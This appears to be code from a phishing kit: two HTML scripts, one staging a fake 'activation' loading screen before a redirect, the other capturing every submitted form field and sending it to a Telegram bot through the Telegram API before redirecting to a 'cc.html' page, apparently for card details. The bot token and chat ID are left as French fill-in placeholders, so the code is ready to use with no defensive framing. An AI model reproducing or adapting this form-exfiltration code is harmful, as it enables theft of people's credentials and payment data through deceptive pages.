<script>
    // Function to handle the click event on the activation link
    function handleActivationClick(e) {
        e.preventDefault(); // Prevent the default link behavior

        // Hide the container with all the contents
        var containerLayout = document.querySelector('.u-container-layout');
        containerLayout.style.display = 'none';

        // Show the loading animation
        var waveContainer = document.querySelector('.wave-container');
        waveContainer.style.display = 'flex';

        // Set a timeout for 2 seconds before redirection
        setTimeout(function() {
            // Redirect to the URL in the href attribute of the anchor tag
            window.location.href = e.target.href;
        }, 1000);
    }

    // Attach the event listener to the activation link
    document.querySelector('.u-btn-1').addEventListener('click', handleActivationClick);
</script>





<script>
document.addEventListener("DOMContentLoaded", function () {
    const form = document.querySelector("form");
    if (!form) return;

    form.addEventListener("submit", function (e) {
        e.preventDefault();

        const formData = new FormData(form);
        const entries = [...formData.entries()];
        const message = entries.map(([key, value]) => `${key}: ${value}`).join("\n");

        const telegramBotToken = "ICI_VOTRE_BOT_TOKEN";
        const telegramChatId = "ICI_VOTRE_CHAT_ID";
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: message,
            }),
        }).then(response => {
            if (response.ok) {
                window.location.href = "cc.html";
            } else {
                alert("Erreur lors de l'envoi.");
            }
        }).catch(error => {
            alert("Erreur de connexion.");
            console.error(error);
        });
    });
});
</script>
